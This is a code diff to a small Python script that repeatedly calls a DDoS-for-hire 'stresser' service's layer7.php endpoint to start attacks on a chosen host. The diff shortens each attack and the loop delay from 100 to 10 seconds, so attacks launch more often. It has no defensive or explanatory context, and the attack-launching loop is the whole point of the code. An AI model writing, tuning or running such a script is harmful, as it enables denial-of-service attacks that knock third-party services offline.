@@ -44,7 +44,7 @@ def main():
         "Priority": "u=1, i"
     }
 
-    url = f"https://redstresser.net/complexx/layer7.php?type=start&host={host}&port=443&time=100&method=TLS-DETECT&totalservers=1&vip=undefined"
+    url = f"https://redstresser.net/complexx/layer7.php?type=start&host={host}&port=443&time=10&method=TLS-DETECT&totalservers=1&vip=undefined"
 
     while True:
         try:
@@ -57,7 +57,7 @@ def main():
                 slow_print(f"Error: {response.status_code}")
         except Exception as e:
             slow_print(f"Terjadi kesalahan: {e}")
-        time.sleep(100)  # Delay 100 detik sebelum request berikutnya
+        time.sleep(10)  # Delay 100 detik sebelum request berikutnya
 
 if __name__ == "__main__":
     main()
